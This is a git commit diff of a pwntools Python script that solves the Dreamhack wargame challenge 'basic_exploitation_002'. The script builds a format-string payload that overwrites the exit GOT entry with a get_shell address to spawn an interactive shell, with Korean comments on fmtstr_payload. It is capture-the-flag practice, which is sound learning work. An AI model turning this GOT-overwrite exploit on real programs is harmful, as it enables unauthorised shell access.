c40cacee306092092c556c20919deb6996fd4294
zzzangmans1 <52357235+zzzangmans1@users.noreply.github.com>
2021-11-21 04:32:23 +0900

    Wargame - Dreamhack [basic_exploitation_002]

--- python/basic_002.py
+++ python/basic_002.py
@@ -1,12 +1,11 @@
 from pwn import *
 
-x = process('./basic_exploitation_002')
-x = remote('host1.dreamhack.games', 17022)
-e = ELF('./basic_exploitation_002')
+p =process("./basic_exploitation_002")
 
-# fmtstr_payload는 포맷스트링 버그가 있을 때 알아서 payload 코드를 짜주는 함수
-# 1. 프로그램실행하고 AAAA 입력하고 %x %x를 줘서 위치가 1번 인자이다.
-payload = fmtstr_payload(1, {e.got['exit'] : e.symbols['get_shell']})
-x.send(payload)
+exit_got = 0x804a024
+shell = 0x8048609
+#fmtstr_payload 함수는 포맷스트링 버그 exploit 코드를 짜주는 함수
+payload = fmtstr_payload(1, {exit_got : shell})
+p.sendline(payload)
 
-x.interactive()
+p.interactive()
